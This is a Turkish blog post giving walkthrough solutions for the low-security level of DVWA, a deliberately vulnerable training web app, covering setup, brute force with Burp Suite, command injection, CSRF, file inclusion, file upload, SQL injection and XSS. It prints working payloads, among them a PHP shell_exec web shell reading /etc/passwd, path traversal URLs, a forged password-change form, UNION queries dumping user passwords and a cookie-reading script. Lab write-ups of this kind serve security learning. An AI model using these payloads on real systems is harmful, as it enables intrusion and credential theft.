---
layout: post
title: DVWA (Low-Level) Çözümleri
categories: tr
---



&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Damn Vulnerable Web App <strong>(DVWA)</strong>, savunmasız olan bir PHP / MySQL web uygulamasıdır. Ana hedefleri, güvenlik uzmanlarının yasal ortamda becerilerini ve araçlarını test etmelerine, web geliştiricilerinin web uygulamalarını güvence altına alma süreçlerini daha iyi anlamalarına ve öğretmenlerin / öğrencilerin sınıf ortamında web uygulaması güvenliğini öğrenmesine / öğretmesine yardımcı olmalarına yardımcı olmaktır .

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;GNU/Linux makinanıza DVWA kurulumu için gereken adımları aşağıda listeledim. 


	1. nano dvwa/config/config.inc.php

	_DVWA[ 'db_password' ] = 'sizin_sifeniz'; 

	2. nano /etc/php/7.0/apache2/php.ini

	allow_url_include = Off --> On      //olarak değiştiriyoruz.

	3. chmod -R 777 /var/www/html/dvwa  //Dosya İzini veriyoruz.

	4. create database dvwa;          //Veri tabanı oluşturuyoruz. 

	5. nano /etc/apache2/apache2.conf   //Dosyasına giderek an alt satıra 'ServerName localhost' 

	ekliyoruz

	6. /etc/init.d/apache2 start

	7. /etc/init.d/mysql start

	8. localhost/dvwa/setup.php          //Tarayıcıdan bu adrese giderek başlayabiliriz.



<h4>Brute Force</h4>


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Burada <strong>Burp Suite</strong> aracını kullanarak parametreler yakalayacağız ve bu parametrelere kelimelere gönderip kırmaya çalışacağız. Önce Burp Suite ile tarayıcımızı senkronize çalışır hale getirmek için aşağıdaki adımları izliyoruz.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Tarayıcıdan <strong>Preferences -> Advanced -> Network -> Settings</strong> bölümüne geliyoruz. Burada Manual proxy configuration kısmını işaretleyip
<strong>HTTP Proxy : 127.0.0.1 , Port : herhangi birşey</strong> yapıp  geri kalan herşeyi boş bırakıyoruz.


 <img src="/img/brute-force/mozilla-proxy.png"> 
 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sonra Burp başlatıp Proxy Bölümüne geliyoruz. Buradan da <strong>Options</strong> bölümüne gelerek <strong>Proxy Listener</strong> sekmesine yeni bir ekleme yapıyoruz . <strong>Interface : 127.0.0.1 Port : 7777</strong> .
Bundan sonra Burp ile tarayıcımız senkronize çalışacak. 

 <img src="/img/brute-force/burp-add-proxy.png">



&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sonra <strong>Intercept</strong> kısmına geliyoruz. Intercept ON 'a tıklayıp tarayıcıdan Brute Force  kısmına giriş yapmak için bir şeyler yazıp submit 
ediyoruz. Bu olurken BURP' te birtakım değişiklikler olduğunu görüyoruz.

 <img src="/img/brute-force/catch-info.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>GET</strong> sonucunu aldıktan sonra gelen bütün datayı seçip <strong>INTRUDER</strong> bölümüne gönderiyoruz. 
Orada '$' işaretlerini temizliyoruz. USERNAME ve PASSWORD kısmındakiler kalıyor. 
Çünkü değiştirip wordlist saldırısı şeklinde bu değişkenleri yollayacağız. Oturum bilgisi ve diğer değişkenler sabit kalacak.

 <img src="/img/brute-force/parameters.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sonrasında aynı sayfada atak tipini <strong>'Cluster Bomb'</strong> olarak değiştiriyoruz. Sonra <strong>Payloads</strong> Bölümüne gelip 'Payload Set =1' yapıyoruz. Önce username için yollayacağımız kelimeleri
bu payload set altına dolduruyoruz. Sonrasında 'Payload Set =2' yapıp burada da password için 
yollayacağımız  kelimeleri ekliyoruz. Sonrasında 'Options' bölümüne geliyoruz. Burada 
<strong>'Grep-Match'</strong> kısmına sonucumuz doğru olduğu takdirde dönen değerin ne olacağı tahminini yapmamız gerekiyor. Eşleştiğinde username ve password değerlerimizin doğru olduğunu anlarız. 


 <img src="/img/brute-force/result.png">


<h4>Command Injection</h4>


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Önce ping için istedeği ip adresini verdikten sonra şöyle yazarak ;

	1. 127.0.0.1 && echo "Ctr1l" 

ping işlemlerinin altında yazdığımız komutun sonucunu görüyoruz. Buradan 
"Command Injection" yapılabildiğini anlıyoruz.Devamında ;

	1. 192.168.0.1 && echo "<?php echo shell_exec('cat /etc/passwd')  ?>" >> test.php
	2. http://localhost/DVWA-master/vulnerabilities/exec/test.php


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Passwd</strong> dosyasını ekrana bastıracak bir PHP kodu yazdım ve bunu içeriye test.php olarak yolladım. Bu sayfaya gittiğimizde passwd dosyasının içeriğini görüyoruz.



<h4>CSRF</h4>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Kaynağı görüntüleyip şifre değiştirme formunu alıyoruz. Buraya göndermek istediğimiz datayı <strong>'value'</strong> olarak kodumuza ekliyoruz. Sonra bu verilerin nereye gideceğini belirtmemiz gerekiyor. Bunu da "http://localhost/DVWA-master/vulnerabilities/csrf/?"   olarak görüyoruz ve <strong>#</strong> kısmını buna göre düzenliyoruz.

	<html>


	<form action="http://localhost/DVWA-master/vulnerabilities/csrf/?" method="GET">
	New password:<br />
	<input type="password" AUTOCOMPLETE="off" name="password_new" value="ctr1l"><br />
	Confirm new password:<br />
	<input type="password" AUTOCOMPLETE="off" name="password_conf" value="ctr1l"><br />
	<br />
	<input type="submit" value="Change" name="Change">

	</form>

	</html>


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bu kodu tarayıcımızda çalıştırdığımızda asıl şifre değiştirme formumuzu doldurduğunu ve şifrenin değiştirildiğini görüyoruz.











<h4>File Inclusion</h4>

	1. http://localhost/DVWA-master/vulnerabilities/fi/?page=/etc/passwd

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Tarayıcıdan yazdığımızda  önümüzde /etc/passwd dosyası açılıyor.
Deneyerek dizinler arası dolaşarak farklı dosyalara ulaşabiliriz.

	1. http://localhost/DVWA-master/vulnerabilities/fi/?page=../../../../../../var/www/html/index.html



<h4>File Upload</h4>

	1. <?php echo shell_exec('cat /etc/passwd')  ?>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bu kodu içeren dosyayı upload edip sisteme kendi php sayfamızı yüklemiş oluyoruz. Çeşitli işlemler yapacak sayfayı
oluşturmak bize kalıyor. Bu sayfaya gidecek olursak passwd dosyasının içeriğini görebiliriz.

	1. http://localhost/DVWA-master/hackable/uploads/shell.php

<h4>SQL Injection</h4>


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Boş alana 'or 1 or' yaptıktan sonra sorgu inject edebileceğimizi anlıyoruz ve tüm isimleri listeliyoruz.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sonrasında kaç tane sütunumuz olduğunu anlamak için <strong>'order by 1 #, 'order by 2 # , 'order by 3 # </strong>
ifadelerini denerken 3'te hata alıyoruz. Buradan içeride 2 tane sütunumuz olduğunu anlıyoruz.
Bundan sonraki ifadelerimizi buna göre yazacağız.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Önce <strong>database</strong> ve <strong>versiyon</strong> bilgisi için şu sorguyu gönderiyoruz.

	1. 'union select database(),version() 

<img src="/img/sqli/database-version.png">





&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Tablo</strong> bilgileri için şu sorguyu gönderiyoruz.

	1. 'union select table_name,2 from information_schema.tables #

<img src="/img/sqli/tables.png">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Kullanıcı bilgileri</strong> için gönderdiğimiz sorgu da şu şekilde : 

	1. 'union select user,password from users #

<img src="/img/sqli/users.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bu şekilde devam ederek çeşitli bilgileri edinebiliriz.



<h4>XSS (Reflected)</h4>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Gelecek olan tepkiyi görmek için şöyle bir betik yolluyoruz. Buradan gelen <strong>'HELLO'</strong> mesajından da anlayacağımız üzere kodlarımızı çalıştırabileceğimizi anlıyoruz.

	1. <script>alert("Ctr1l")</script>



<h4>XSS (Stored)</h4>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Reflected kısmındaki gibi bir denemeyle kod çalıştırabileceğimizi anlıyoruz.

	1. <script>alert(document.cookie)</script>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Artık kodumuz içeride saklanıyor. Her ekleme yapmak istediğimizde ekleme işleminin yanında o  kodumuz da çalışacak ve  verilen görevi yapacak.











































